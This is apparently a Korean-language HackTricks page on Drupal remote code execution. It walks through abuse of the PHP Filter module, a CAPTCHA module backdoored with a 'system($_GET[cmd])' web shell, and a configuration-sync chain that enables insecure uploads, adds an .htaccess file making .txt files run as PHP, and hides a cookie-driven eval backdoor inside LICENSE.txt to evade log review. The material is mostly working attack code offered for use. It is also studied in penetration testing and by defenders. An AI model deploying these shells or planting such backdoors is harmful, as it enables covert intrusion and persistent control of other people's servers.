# Drupal RCE

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 처음부터 전문가까지 배우세요!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)을 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **귀하의 해킹 기술을 공유**하세요.

</details>

## PHP 필터 모듈을 사용하는 경우

{% hint style="warning" %}
이전 버전의 Drupal **(버전 8 이전)**에서는 관리자로 로그인하여 **`PHP 필터` 모듈을 활성화**할 수 있었으며, 이 모듈은 "내장 PHP 코드/스니펫을 평가할 수 있게 함"을 의미합니다. 그러나 버전 8부터 이 모듈은 기본적으로 설치되지 않습니다.
{% endhint %}

**플러그인 php가 설치되어 있어야**합니다 (접근하여 _/modules/php_에 액세스하여 **403**이 반환되면 **존재**합니다. **찾을 수 없으면**, **플러그인 php가 설치되지 않은 것**입니다)

_모듈_로 이동 -> (**확인**) _PHP 필터_ -> _구성 저장_

![](<../../../.gitbook/assets/image (247) (1).png>)

그런 다음 _콘텐츠 추가_를 클릭 -> _기본 페이지_ 또는 _기사 선택_ -> _본문에 php 쉘코드 작성_ -> _텍스트 형식_에서 _PHP 코드_ 선택 -> _미리 보기_ 선택

![](<../../../.gitbook/assets/image (338).png>)

마지막으로 방금 생성된 노드에 액세스하세요:
```bash
curl http://drupal-site.local/node/3
```
## PHP 필터 모듈 설치

{% hint style="warning" %}
현재 버전에서는 기본 설치 후 웹에 액세스만으로 플러그인을 설치할 수 없습니다.
{% endhint %}

**버전 8부터** [**PHP 필터**](https://www.drupal.org/project/php/releases/8.x-1.1) **모듈은 기본적으로 설치되지 않습니다**. 이 기능을 활용하려면 **모듈을 직접 설치해야 합니다**.

1. Drupal 웹사이트에서 모듈의 최신 버전을 다운로드합니다.
2. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
3. 다운로드가 완료되면 **`관리`** > **`보고서`** > **`사용 가능한 업데이트`**로 이동합니다.
4. **`찾아보기`**를 클릭하여 다운로드한 디렉토리에서 파일을 선택한 후 **`설치`**를 클릭합니다.
5. 모듈이 설치되면 **`콘텐츠`**를 클릭하고 **Drupal 7 예제에서 했던 것과 유사하게 새 기본 페이지를 생성**합니다. 다시 한번 **`텍스트 형식` 드롭다운에서 `PHP 코드`를 선택**해야 합니다.

## 백도어 모듈

{% hint style="warning" %}
현재 버전에서는 기본 설치 후 웹에 액세스만으로 플러그인을 설치할 수 없습니다.
{% endhint %}

백도어가 설치된 모듈은 **기존 모듈에 쉘을 추가하여 생성**할 수 있습니다. 모듈은 drupal.org 웹사이트에서 찾을 수 있습니다. [CAPTCHA](https://www.drupal.org/project/captcha)와 같은 모듈을 선택해 보겠습니다. 아래로 스크롤하여 tar.gz [아카이브](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) 링크를 복사합니다.

* 아카이브를 다운로드하고 내용을 추출합니다.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* 다음 내용으로 **PHP 웹 쉘**을 생성하십시오:
```php
<?php
system($_GET["cmd"]);
?>
```
* 다음으로, 우리는 폴더에 액세스할 수 있도록 **`.htaccess`** 파일을 생성해야 합니다. Drupal은 **`/modules`** 폴더에 대한 직접 액세스를 거부하기 때문에 이 작업이 필요합니다.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* 위의 구성은 /modules에서 파일을 요청할 때 / 폴더에 대한 규칙을 적용합니다. 이 두 파일을 captcha 폴더로 복사하고 아카이브를 생성하십시오.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* 웹사이트에 **관리자 액세스**가 있다고 가정하고, 사이드바에서 **`Manage`**를 클릭한 다음 **`Extend`**를 클릭합니다. 그 다음 **`+ 새 모듈 설치`** 버튼을 클릭하면 `http://drupal-site.local/admin/modules/install`과 같은 설치 페이지로 이동하게 됩니다. 백도어가 설치된 Captcha 아카이브로 이동하여 **`Install`**을 클릭합니다.
* 설치가 성공하면 **`/modules/captcha/shell.php`**로 이동하여 명령을 실행합니다.

## 구성 동기화를 사용하여 Drupal에 백도어 설치하기 <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Coiffeur0x90**에 의해 공유된 글 [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### 파트 1 (_미디어_ 및 _미디어 라이브러리_ 활성화)

_Extend_ 메뉴 (/admin/modules)에서 이미 설치된 것으로 보이는 플러그인을 활성화할 수 있습니다. 기본적으로 _미디어_ 및 _미디어 라이브러리_ 플러그인은 활성화되어 있지 않아 보입니다. 그러므로 이를 활성화해 보겠습니다.

활성화 전:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

활성화 후:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### 파트 2 (_구성 동기화_ 기능 활용) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Drupal 구성 항목을 덤프(내보내기)하고 업로드(가져오기)하기 위해 _구성 동기화_ 기능을 활용할 것입니다:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**시스템 파일.yml 수정**

첫 번째 항목 `allow_insecure_uploads`를 다음과 같이 수정해 시작하겠습니다:

파일: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

파일: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**패치 필드 필드 미디어 문서 필드\_미디어\_문서.yml**

그런 다음 두 번째 항목 `file_extensions`를 다음과 같이 패치하십시오:

파일: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

To:

파일: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> 이 블로그 게시물에서는 사용하지 않지만, 임의로 항목 `file_directory`를 정의하고 Drupal 파일 시스템 트리 내에서 위로 이동할 수 있는 경로 순회 공격에 취약하다는 것을 언급했습니다.

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### 파트 3 (기능 _문서 추가_ 활용) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

마지막 단계는 가장 간단하며, 두 가지 하위 단계로 나뉩니다. 첫 번째는 .htaccess 형식의 파일을 업로드하여 Apache 지시문을 활용하고 .txt 파일을 PHP 엔진에서 해석할 수 있도록 하는 것입니다. 두 번째는 페이로드가 포함된 .txt 파일을 업로드하는 것입니다.

파일: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
왜 이 속임수가 멋진가요?

웹 쉘(여기서는 LICENSE.txt로 부르겠습니다)을 웹 서버에 드롭한 후에는 `$_COOKIE`를 통해 명령을 전송할 수 있으며, 웹 서버 로그에서는 이를 텍스트 파일에 대한 합법적인 GET 요청으로 표시할 것입니다.

왜 웹쉘을 LICENSE.txt로 명명하나요?

단순히 말해서, 예를 들어 [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt)(Drupal 코어에 이미 존재하는 파일)을 살펴보면, 339줄이며 17.6 KB 크기의 파일이며, 중간에 작은 PHP 코드 스니펫을 추가하기에 완벽한 크기입니다(파일이 충분히 크기 때문).
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **파트 3.1 (파일 .htaccess 업로드)**

먼저, 우리는 Apache 지시문을 포함하는 파일을 업로드하기 위해 _Add Document_ (/media/add/document) 기능을 활용합니다.

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**파트 3.2 (파일 LICENSE.txt 업로드)**

그런 다음, 우리는 라이선스 파일 내에 숨겨진 웹쉘을 업로드하기 위해 다시 _Add Document_ (/media/add/document) 기능을 활용합니다.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### 파트 4 (웹쉘과 상호작용) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

마지막 파트는 웹쉘과 상호작용하는 것으로 구성됩니다.

다음 스크린샷에서 볼 수 있듯이, 웹쉘에서 예상되는 쿠키가 정의되지 않은 경우, 웹 브라우저를 통해 파일을 확인할 때 다음 결과를 얻습니다.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

공격자가 쿠키를 설정하면 웹쉘과 상호작용하고 원하는 명령을 실행할 수 있습니다.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

그리고 로그에서 볼 수 있듯이, txt 파일만 요청된 것처럼 보입니다.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

이 기사를 읽어 주셔서 감사합니다. 여러분이 쉘을 얻는 데 도움이 되기를 바랍니다.
